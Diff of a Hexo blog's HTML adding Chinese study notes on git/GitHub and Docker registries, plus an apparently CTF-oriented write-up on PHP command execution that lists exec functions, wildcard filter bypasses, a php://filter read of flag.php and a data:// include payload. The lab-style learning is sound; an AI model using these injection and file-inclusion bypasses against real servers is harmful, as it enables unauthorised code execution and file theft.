+<h2 id="二、git的常用命令"><a href="#二、git的常用命令" class="headerlink" title="二、git的常用命令"></a>二、git的常用命令</h2><h3 id="1-1用户签名"><a href="#1-1用户签名" class="headerlink" title="1.1用户签名"></a>1.1用户签名</h3><p>设置用户签名和绑定邮箱（邮箱可以虚拟）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git configure --global user.name=</span><br><span class="line">git configure --global user.email   //global 是全局的意思</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225200835726.png" class="" title="image-20220225200835726">
+
+<p> <strong>Git 首次安装必须设置一下用户签名，否则无法提交代码</strong>。</p>
+<h3 id="1-2初始化本地仓库"><a href="#1-2初始化本地仓库" class="headerlink" title="1.2初始化本地仓库"></a>1.2初始化本地仓库</h3><p><strong>命令：git init</strong></p>
+<p>首先在喜欢的盘符下面创建文件夹，在打开git bash，然后执行命令</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225201302703.png" class="" title="image-20220225201302703">
+
+<h3 id="1-3-查看git-的状态"><a href="#1-3-查看git-的状态" class="headerlink" title="1.3 查看git 的状态"></a>1.3 查看git 的状态</h3><p><strong>命令：git status</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225201744567.png" class="" title="image-20220225201744567">
+
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225201943589.png" class="" title="image-20220225201943589">
+
+<h3 id="1-4-上传到暂存区，以及删除暂存区的文件"><a href="#1-4-上传到暂存区，以及删除暂存区的文件" class="headerlink" title="1.4 上传到暂存区，以及删除暂存区的文件"></a>1.4 上传到暂存区，以及删除暂存区的文件</h3><p><strong>上传命令： git add 文件</strong></p>
+<p><strong>删除命令： git rm –cached 文件</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225202529243.png" class="" title="image-20220225202529243">
+
+<h3 id="1-5将暂存区文件上传到本地库以及查看提交情况"><a href="#1-5将暂存区文件上传到本地库以及查看提交情况" class="headerlink" title="1.5将暂存区文件上传到本地库以及查看提交情况"></a>1.5将暂存区文件上传到本地库以及查看提交情况</h3><p>上传命令：git commit -m “日志信息” 文件名</p>
+<p>查看命令 ：git reflog  或者 git log</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225205204863.png" class="" title="image-20220225205204863">
+
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225210714083.png" class="" title="image-20220225210714083">
+
+<h3 id="1-6-版本穿插（回到之前的版本）"><a href="#1-6-版本穿插（回到之前的版本）" class="headerlink" title="1.6 版本穿插（回到之前的版本）"></a>1.6 版本穿插（回到之前的版本）</h3><p><strong>命令：git reset –hard  id</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225221148387.png" class="" title="image-20220225221148387">
+
+<h2 id="三、-git分支"><a href="#三、-git分支" class="headerlink" title="三、 git分支"></a>三、 git分支</h2><h3 id="1-1-分支概念"><a href="#1-1-分支概念" class="headerlink" title="1.1 分支概念"></a>1.1 分支概念</h3><p>在版本控制过程中，同时推进多个任务，为每个任务，我们就可以创建每个任务的单独分支。使用分支意味着程序员可以把自己的工作从开发主线上分离开来， 开发自己分支的时候，不会影响主线分支的运行。对于初学者而言，分支可以简单理解为副本，一个分支就是一个单独的副本。（分支底层其实也是指针的引用）</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/f1d0659ed000e9dfa295fc696a58cf74.png" class="" title="某项目有四条分支">
+
+<h3 id="1-2分支的好处"><a href="#1-2分支的好处" class="headerlink" title="1.2分支的好处"></a>1.2分支的好处</h3><p>同时并行推进多个功能开发，提高开发效率。</p>
+<p>各个分支在开发过程中，如果某一个分支开发失败，不会对其他分支有任何影响。失败的分支删除重新开始即可。</p>
+<h3 id="1-3-分支常用命令：查看。创建-切换"><a href="#1-3-分支常用命令：查看。创建-切换" class="headerlink" title="1.3 分支常用命令：查看。创建    切换"></a>1.3 分支常用命令：查看。创建    切换</h3><img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225225034557.png" class="" title="image-20220225225034557">
+
+
+
+<p><strong>查看：git branch -v</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225225806059.png" class="" title="image-20220225225806059">
+
+<p><strong>创建： git branch 分支名</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225225837018.png" class="" title="image-20220225225837018">
+
+<p>切换： git  checkout 分支名</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225230852285.png" class="" title="image-20220225230852285">
+
+<p>==<strong>注意：在host分支下的修改提交到本地仓库后，master分支的text文件并没有改变，需要合并分支才可以</strong>==</p>
+<h3 id="1-4-合并分支（将指定分支合并到当前分支）"><a href="#1-4-合并分支（将指定分支合并到当前分支）" class="headerlink" title="1.4 合并分支（将指定分支合并到当前分支）"></a>1.4 合并分支（将指定分支合并到当前分支）</h3><p><strong>命令：git merge 分支</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225231617732.png" class="" title="image-20220225231617732">
+
+<h3 id="1-5-合并冲突原因以及解决方法"><a href="#1-5-合并冲突原因以及解决方法" class="headerlink" title="1.5 合并冲突原因以及解决方法"></a>1.5 合并冲突原因以及解决方法</h3><p> <strong>冲突产生的原因</strong></p>
+<p>并分支时，两个分支在同一个文件的同一个位置有两套完全不同的修改。 Git 无法替我们决定使用哪一个，因此，必须<strong>人为决定</strong>新代码内容。</p>
+<p><strong>当在同一行进行修改时：会出现报错</strong></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225235933628.png" class="" title="image-20220225235933628">
+
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225235159233.png" class="" title="image-20220225235159233">
+
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225235756771.png" class="" title="image-20220225235756771">
+
+<p>==<strong>注意：当出现冲突时，在git add之后使用git commit -m “日志”后面不能加上文件名</strong>==</p>
+<p>当修改在不同行：</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220226000410247.png" class="" title="image-20220226000410247">
+
+<p>同样报错</p>
+<p>报错原因：我的理解就是无论是不是同一行修改，只要两个分支都修改了，导致git无法区别哪个是最新的就会报错。</p>
+<h2 id="github创建远程库"><a href="#github创建远程库" class="headerlink" title="github创建远程库"></a>github创建远程库</h2><h3 id="1、1由于之前已经创建过一个仓库，所以新建一个仓库"><a href="#1、1由于之前已经创建过一个仓库，所以新建一个仓库" class="headerlink" title="1、1由于之前已经创建过一个仓库，所以新建一个仓库"></a>1、1由于之前已经创建过一个仓库，所以新建一个仓库</h3><p> 点击图标旁边的下三角形，选择Your profile 进来之后选择Repositories </p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/70.png" class="" title="img">
+
+<p>  然后我们new一个仓库出来，点击new</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/70-16458387370221.png" class="" title="img">
+
+<p>  然后进来的Repository name随便起一个名字，然后最下面的create repository就建好远程仓库啦</p>
+<p><strong><img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/70-16458387370232.png" class="" title="img"></strong></p>
+<h3 id="1-2创建远程仓库别名"><a href="#1-2创建远程仓库别名" class="headerlink" title="1.2创建远程仓库别名"></a>1.2创建远程仓库别名</h3><p>命令：git remote -v  差康当前所有远程地址别名</p>
+<p>命令：git remote add 别名 远程地址       创建别名</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220226092946711.png" class="" title="image-20220226092946711">
+
+<h3 id="1、3将本地仓库推送到远程仓库推送命令："><a href="#1、3将本地仓库推送到远程仓库推送命令：" class="headerlink" title="1、3将本地仓库推送到远程仓库推送命令："></a>1、3将本地仓库推送到远程仓库推送命令：</h3><p>推送命令：git push  仓库名  分支名（需要推送的分支)</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220226094410186.png" class="" title="image-20220226094410186">
+
+<h3 id="1-4-将远程仓库的代码拉取下来，以便更新本地仓库代码"><a href="#1-4-将远程仓库的代码拉取下来，以便更新本地仓库代码" class="headerlink" title="1.4 将远程仓库的代码拉取下来，以便更新本地仓库代码"></a>1.4 将远程仓库的代码拉取下来，以便更新本地仓库代码</h3><p>命令：git pull 仓库名 分支</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220226095005243.png" class="" title="image-20220226095005243">
+
+<h3 id="1-5-克隆远程仓库"><a href="#1-5-克隆远程仓库" class="headerlink" title="1.5 克隆远程仓库"></a>1.5 克隆远程仓库</h3><p><strong>命令：git clone 链接</strong></p>
+<p>clone 会做如下操作：</p>
+<ol>
+<li>拉取代码。</li>
+<li>初始化本地仓库。</li>
+<li>创建别名。</li>
+</ol>
+<p>在远程库获取地址URL</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/ff23330d5eab8f2a681c6f91727a37ca.png" class="" title="img">
+
+<h3 id="1-6团队内合作"><a href="#1-6团队内合作" class="headerlink" title="1.6团队内合作"></a>1.6团队内合作</h3><h2 id="GitHub-团队内协作"><a href="#GitHub-团队内协作" class="headerlink" title="GitHub_团队内协作"></a>GitHub_团队内协作</h2><p>一、选择邀请合作者。（在仓库设置里操作）</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/945f1ba6e29fb725ee0d852ff59c3851.png" class="" title="img">
+
+<p>二、填入目标合作者。</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/ee1b6a6656efe2adbb740b38954529b9.png" class="" title="img">
+
+<p>三、复制网址发送给你目标合作者 ， 复制内容如下：<a target="_blank" rel="noopener" href="https://github.com/atguiguyueyue/git-shTest/invitations%E3%80%82">https://github.com/atguiguyueyue/git-shTest/invitations。</a></p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/0f5ec0155e64421d315594aa537fd187.png" class="" title="img">
+
+<p>四、目标合作者接收到网址，用浏览器打开它，点击接受邀请。</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/295a2398e0a3150d50530d5db21103aa.png" class="" title="img">
+
+<p>五、接受邀请成功之后，可以在目标合作者Github账号上看到将来共同开发远程仓库。</p>
+<img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/ddca26e11277016e10eb610195567dac.png" class="" title="img">
+
+<p>六、目标合作者可以修改内容并 push 到远程仓库。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-23 22:41:46" itemprop="dateCreated datePublished" datetime="2022-02-23T22:41:46+08:00">2022-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-28 12:13:26" itemprop="dateModified" datetime="2022-02-28T12:13:26+08:00">2022-02-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="==web29=="></a>==web29==</h2><h3 id="前提补充知识："><a href="#前提补充知识：" class="headerlink" title="前提补充知识："></a>前提补充知识：</h3><h4 id="1、四个外部执行命令"><a href="#1、四个外部执行命令" class="headerlink" title="1、四个外部执行命令"></a>1、四个外部执行命令</h4><p>exec（）、passthru（）、system（）、shell_exec（）</p>
+<h4 id="2、通配符"><a href="#2、通配符" class="headerlink" title="2、通配符"></a>2、通配符</h4><p>当查找文件夹时；当不知道真正字符或者不想键入完整名字时，常常使用通配符代替一个或多个真正字符。（==可以通过这样绕过限制==</p>
+<p><strong>可以使用星号（*）代替零个、单个或多个字符</strong></p>
+<p><strong>可以使用问号(?)代替一个字符</strong></p>
+<p><img src="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220222225722049.png" alt="image-20220222225722049"><img src="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220222230204874.png" alt="image-20220222230204874"></p>
+<h2 id="web-30"><a href="#web-30" class="headerlink" title="==web 30 ==="></a>==web 30 ===</h2><img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220222230459915.png" class="" title="image-20220222230459915">
+
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220222230856809.png" class="" title="image-20220222230856809">
+
+
+
+
+
+
+
+<h2 id="web31-eval嵌套执行get-以及空格绕过"><a href="#web31-eval嵌套执行get-以及空格绕过" class="headerlink" title="==web31 *   eval嵌套执行get 以及空格绕过=="></a>==web31 *   eval嵌套执行get 以及空格绕过==</h2><p><img src="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223001513510.png" alt="image-20220223001513510"><img src="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223003134411.png"></p>
+<h3 id="32-主要是过滤了分号和括号（了解无分号函数，以及伪协议）"><a href="#32-主要是过滤了分号和括号（了解无分号函数，以及伪协议）" class="headerlink" title="==32  主要是过滤了分号和括号（了解无分号函数，以及伪协议）=="></a>==32  主要是过滤了分号和括号（了解无分号函数，以及伪协议）==</h3><p>分析：</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223115610843.png" class="" title="image-20220223115610843">
+
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1999159-20201002223158950-1419102854.png" class="" title="img">
+
+
+
+<p><strong>做法：</strong>php://filter/convert.base64-encode/resource=flag.php</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223122013144.png" class="" title="image-20220223122013144">
+
+<h3 id="web33-主要尝试几个无括号函数"><a href="#web33-主要尝试几个无括号函数" class="headerlink" title="==web33 主要尝试几个无括号函数=="></a>==web33 主要尝试几个无括号函数==</h3><p>方法一</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223223719202.png" class="" title="image-20220223223719202">
+
+<p>方法二</p>
+<p><img src="D:/boke/source/_posts/命令执行/image-20220223224212323.png" alt="image-20220223224212323"></p>
+<h3 id="web34"><a href="#web34" class="headerlink" title="==web34=="></a>==web34==</h3><p>分析：</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220223225056215.png" class="" title="image-20220223225056215">
+
+<p>web35和36都一样</p>
+<h3 id="web37-include文件包含"><a href="#web37-include文件包含" class="headerlink" title="==web37 include文件包含=="></a>==web37 include文件包含==</h3><h4 id="补充知识：include和data伪协议"><a href="#补充知识：include和data伪协议" class="headerlink" title="补充知识：include和data伪协议"></a>补充知识：include和data伪协议</h4><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
+<p>用法：data://text/plain,<?php phpinfo();?></p>
+<p>可以参考笔记伪协议学习</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227202837027.png" class="" title="image-20220227202837027">
+
+<h3 id="web-38-include文件包涵（过滤了PHP）"><a href="#web-38-include文件包涵（过滤了PHP）" class="headerlink" title="==web 38 include文件包涵（过滤了PHP）=="></a>==web 38 include文件包涵（过滤了PHP）==</h3><h4 id="前提知识：PHP过滤绕过可以通过base64-或用-lt-代替-lt-php"><a href="#前提知识：PHP过滤绕过可以通过base64-或用-lt-代替-lt-php" class="headerlink" title="前提知识：PHP过滤绕过可以通过base64 或用&lt;?==  代替&lt;?php"></a>前提知识：PHP过滤绕过可以通过base64 或用&lt;?==  代替&lt;?php</h4><p>分析：</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227204038939.png" class="" title="image-20220227204038939">
+
+<p>做法一：</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227204328459.png" class="" title="image-20220227204328459">
+
+<p>做法二：用base64</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227205212455.png" class="" title="image-20220227205212455">
+
+<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>继续用上题的解法</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227210520291.png" class="" title="image-20220227210520291">
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/docker%E9%AB%98%E7%BA%A7%E7%AF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -574,10 +1186,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-02-22 12:38:42 / 修改时间：12:39:43" itemprop="dateCreated datePublished" datetime="2022-02-22T12:38:42+08:00">2022-02-22</time>
+              <time title="创建时间：2022-02-22 12:38:42" itemprop="dateCreated datePublished" datetime="2022-02-22T12:38:42+08:00">2022-02-22</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-25 19:06:26" itemprop="dateModified" datetime="2022-02-25T19:06:26+08:00">2022-02-25</time>
+              </span>
 
           
 
@@ -751,7 +1369,95 @@
 <h4 id="5、docker镜像"><a href="#5、docker镜像" class="headerlink" title="5、docker镜像"></a>5、docker镜像</h4><p><strong>什么是镜像</strong></p>
 <p><strong>镜像</strong>是一种轻量级，可执行的软件包，用来打包软件运行环境和基于运行软件开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
 <p>所有的应用，直接打包成docker镜像，就可以直接跑起来.</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+<h2 id="三、commit命令"><a href="#三、commit命令" class="headerlink" title="三、commit命令"></a>三、commit命令</h2><p>在docker中添加功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install 需要的功能</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>是什么</strong>：·     docker commit提交容器副本使之成为一个新的镜像（也就是说让我们的容器成为镜像）</p>
+<p>==生成镜像有两种方法：一种用docke==</p>
+<p>==dockerfile一种用commit==</p>
+<p><strong>用法</strong>：·     docker commit -m=”提交的描述信息” -a=”作者” 容器ID 要创建的目标镜像名:[标签名]</p>
+<h2 id="四、将镜像推送到腾讯云（之前注册有了）"><a href="#四、将镜像推送到腾讯云（之前注册有了）" class="headerlink" title="四、将镜像推送到腾讯云（之前注册有了）"></a>四、将镜像推送到腾讯云（之前注册有了）</h2><p><em><strong>*1、添加容器*</strong></em></p>
+<p>打开腾讯云控制台，在上方菜单栏 加号图标 选择容器服务，如图：</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWxpdXlhbmc=,size_16,color_FFFFFF,t_70.png" class="" title="img">
+
+<p>这样上方菜单就会显示出容器服务。</p>
+<p><em><strong>*2、开通镜像服务*</strong></em></p>
+<p>选择容器服务，浏览器左侧菜单会显示与容器服务相关的导航菜单，点击“<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%95%9C%E5%83%8F&spm=1001.2101.3001.7020">镜像</a>仓库”下面的“我的镜像”，会提示开通镜像服务，根据提示输入仓库密码。这个密码用来登录镜像仓库，到后面会用到。</p>
+<p><em><strong>*3、创建命名空间*</strong></em></p>
+<p>在“我的镜像”里面创建命名空间，如图：</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWxpdXlhbmc=,size_16,color_FFFFFF,t_70-16457180748391.png" class="" title="img">
+
+<p><em><strong>*4、创建镜像仓库*</strong></em></p>
+<p>在“我的镜像”一栏里面继续创建镜像仓库，命名空间选择上一步创建的即可。创建成功之后，如图：</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWxpdXlhbmc=,size_16,color_FFFFFF,t_70-16457180748392.png" class="" title="img">
+
+<p><em><strong>*5、推送镜像*</strong></em></p>
+<p> 点击进入镜像仓库，可以看到列表是空的，说明没有镜像文件，列表左上角有一个按钮“使用指引”，里面可以看到 登录到镜像，拉取镜像和推送镜像的相关命令，如图：</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWxpdXlhbmc=,size_16,color_FFFFFF,t_70-16457182495466.png" class="" title="img">
+
+
+
+<h2 id="五、将本地镜像推送到私有仓库"><a href="#五、将本地镜像推送到私有仓库" class="headerlink" title="五、将本地镜像推送到私有仓库"></a>五、将本地镜像推送到私有仓库</h2><p>·     下载镜像Docker Registry</p>
+<p>docker pull registry </p>
+<p>​             <img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002328063.png" class="" title="image-20220225002328063">                  </p>
+ <img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002334191.png" class="" title="image-20220225002334191">
+
+<p>·     运行私有库Registry，相当于本地有个私有Docker hub</p>
+<p>docker run -d -p 5000:5000 -v /zzyyuse/myregistry/:/tmp/registry –privileged=true registry</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002352418.png" class="" title="image-20220225002352418">
+
+<p>默认情况，仓库被创建在容器的/var/lib/registry目录下，建议自行用容器卷映射，方便于宿主机联调</p>
+<p>·     curl验证私服库上有什么镜像</p>
+<p> curl -XGET <a target="_blank" rel="noopener" href="http://192.168.111.162:5000/v2/_catalog">http://192.168.111.162:5000/v2/_catalog</a></p>
+<p>可以看到，目前私服库没有任何镜像上传过。。。。。。</p>
+ <img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002540154.png" class="" title="image-20220225002540154">
+
+<p>​                               </p>
+<p>·     将新镜像zzyyubuntu:1.2修改符合私服规范的Tag</p>
+<p> <strong>==  按照公式： docker  tag  镜像:Tag  Host:Port/Repository:Tag</strong></p>
+<p><strong>自己host主机IP地址，填写同学你们自己的，不要粘贴错误，O(∩_∩)O</strong></p>
+<p><strong>使用命令 docker tag 将zzyyubuntu:1.2 这个镜像修改为192.168.111.162:5000/zzyyubuntu:1.2</strong></p>
+<p>docker tag zzyyubuntu:1.2 192.168.111.162:5000/zzyyubuntu:1.2</p>
+ <img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002656354.png" class="" title="image-20220225002656354">
+
+<p>·     修改配置文件使之支持http</p>
+<p> vim命令新增如下下面一行：vim /etc/docker/daemon.json</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;     &quot;registry-mirrors&quot;:  [&quot;https://aa25jngu.mirror.aliyuncs.com&quot;],     &quot;insecure-registries&quot;: [&quot;192.168.111.162:5000&quot;]  &#125;  </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>上述理由：docker默认不允许http方式推送镜像，通过配置选项来取消这个限制。====&gt; 修改完后如果不生效，建议重启docker</p>
+<p>·     push推送到私服库</p>
+<p>docker push 192.168.111.162:5000/zzyyubuntu:1.2</p>
+ <img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225002910558.png" class="" title="image-20220225002910558">
+
+<p>​                               </p>
+<h2 id="六、容器数据卷"><a href="#六、容器数据卷" class="headerlink" title="六、容器数据卷"></a>六、容器数据卷</h2><p>为什么：</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225124329751.png" class="" title="image-20220225124329751">
+
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225124603527.png" class="" title="image-20220225124603527">
+
+<p><strong>特点：</strong></p>
+<p>==<strong>1：数据卷可在容器之间共享或重用数据</strong>==</p>
+<p><strong>2：卷中的更改可以直接实时生效，爽</strong></p>
+<p><strong>3：数据卷中的更改不会包含在镜像的更新中</strong></p>
+<p><strong>4：数据卷的生命周期一直持续到没有容器使用它为止</strong></p>
+<p><strong>5、docker在删除容器时不会删除挂载的数据卷</strong></p>
+<h4 id="2、容器挂载实例"><a href="#2、容器挂载实例" class="headerlink" title="2、容器挂载实例"></a>2、容器挂载实例</h4><img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225130616698.png" class="" title="image-20220225130616698">
+
+
+
+<p>可以发现对应宿主机的文件夹上了有了对应文件</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225130708088.png" class="" title="image-20220225130708088">
+
+<p>查看容器挂载情况</p>
+<p>命令：docker inspect id</p>
+<img src="/2022/02/22/%E2%80%9Cdocker%E5%9F%BA%E7%A1%80%E7%AF%87%E2%80%9D/image-20220225131633870.png" class="" title="image-20220225131633870">
+
       
     </div>
 
@@ -1338,7 +2044,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
